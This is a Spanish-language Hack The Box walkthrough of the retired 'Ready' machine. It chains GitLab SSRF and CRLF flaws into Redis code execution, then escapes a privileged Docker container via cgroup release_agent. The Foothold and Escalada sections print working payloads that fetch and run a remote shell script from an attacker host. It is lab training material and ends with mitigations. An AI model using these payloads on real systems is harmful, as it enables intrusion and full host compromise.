---
machine: Ready
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, gitlab, ssrf, crlf, redis, docker, privileged, cgroup, privesc]
---

# Ready — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

GitLab 11.4.7 en `5080` es vulnerable a la SSRF CVE-2018-19571 y a la inyección CRLF CVE-2018-19585 en la importación de repositorios. La SSRF esquiva el bloqueo de `127.0.0.1` con la dirección IPv6 `[0:0:0:0:0:ffff:127.0.0.1]` y el CRLF permite enviar comandos a Redis en `6379`. Con `GitlabShellWorker` y `class_eval` se ejecuta una shell como `git` dentro del contenedor. El compose monta `/root_pass` con la contraseña inicial de root, lo que permite `su -`. El contenedor corre con `privileged: true`; el escape por `release_agent` de cgroups, o el montaje del disco del host, dan root en la máquina.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,5080 <IP>
```

- `22`: OpenSSH 8.2p1 Ubuntu.
- `5080`: GitLab 11.4.7 sobre HTTP.

```bash
echo '<IP> ready.htb' | sudo tee -a /etc/hosts
```

## Enumeración

La página principal es GitLab. Se crea una cuenta y se comprueba la versión en `/help`; la instancia está desactualizada. En **New Project → Import Project → Repo by URL** el servidor hace una petición a la URL indicada, lo que confirma la SSRF.

```bash
curl -s http://ready.htb:5080/help | grep -i version
```

## Foothold

La importación acepta `http://`, `https://` y `git://`. GitLab bloquea `127.0.0.1`, pero no la representación IPv6 de loopback:

```text
http://[0:0:0:0:0:ffff:127.0.0.1]:6379
```

Con `git://` la petición es más limpia. La CVE-2018-19585 permite insertar saltos de línea en la URL y, por tanto, comandos Redis independientes. Se intercepta la importación en Burp y se envía un cuerpo como este:

```text
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open('|curl http://<LHOST>/shell.sh|bash').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"<JID>\",\"created_at\":0,\"enqueued_at\":0}"
 exec
```

La URL debe apuntar a Redis por loopback:

```text
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/.git
```

Al crear el proyecto, el worker ejecuta el `class_eval` y llega una shell como `git`. También existen exploits automatizados para esta cadena.

```bash
python3 -c 'import pty; pty.spawn("bash")'
```

## Movimiento lateral

Dentro del contenedor se confirma el aislamiento con `/.dockerenv`. El compose monta el archivo `/root_pass`, que contiene la contraseña inicial de root de GitLab:

```bash
cat /root_pass
su -
```

## Escalada de privilegios

El `docker-compose.yml` del host define el servicio con `privileged: true`. Esa bandera permite escapar del contenedor. Una vía es el `release_agent` de cgroups: se monta el `cgroup` del host, se escribe un script y se fuerza su ejecución desde el contenedor.

```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$t/c" > "$d/release_agent"
printf '#!/bin/sh\ncurl http://<LHOST>/shell.sh | bash' > /c
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
```

La segunda vía es montar el disco del host desde el contenedor privilegiado y leer `/mnt/root/root.txt` o escribir una clave en `/mnt/root/.ssh/authorized_keys`.

## Evidencia

- GitLab 11.4.7 y formulario de importación por URL.
- SSRF contra `[0:0:0:0:0:ffff:127.0.0.1]:6379`.
- Comandos Redis inyectados por CRLF y shell como `git`.
- `/root_pass` leído y `su -` correcto en el contenedor.
- `privileged: true` en el compose y ejecución como root en el host.

## Lecciones aprendidas

- Una lista negra de `127.0.0.1` no cubre todas las representaciones de loopback.
- El CRLF en URLs de importación convierte una SSRF en inyección de protocolo.
- Redis sin autenticación y alcanzable por loopback es ejecución de código.
- Los secretos montados en el contenedor deben ser ilegibles para la aplicación.
- `privileged: true` anula el aislamiento y permite escapar al host.

## Mitigaciones y detección

- Actualizar GitLab y validar las URL de importación contra una lista blanca.
- Bloquear loopback, IPv4/IPv6 mapeadas y rangos internos en el resolvedor.
- Rechazar caracteres de control y saltos de línea en URL.
- Exigir autenticación a Redis y no exponerlo fuera de la aplicación.
- Evitar contenedores privilegiados y montar solo los volúmenes necesarios.
- Monitorizar `release_agent`, montajes de cgroups y procesos `chroot` inesperados.

## Referencias

- [0xdf — Ready](https://0xdf.gitlab.io/2021/05/15/htb-ready.html)
- [Hack The Box — Ready](https://app.hackthebox.com/machines/ready)
- [NVD — CVE-2018-19571](https://nvd.nist.gov/vuln/detail/CVE-2018-19571)
- [NVD — CVE-2018-19585](https://nvd.nist.gov/vuln/detail/CVE-2018-19585)
- [Knowledge — Escape por release_agent](../../../knowledge/linux/cgroup-release-agent-escape.md)
- [Knowledge — Escape de contenedor privilegiado](../../../knowledge/linux/docker-privileged-escape.md)
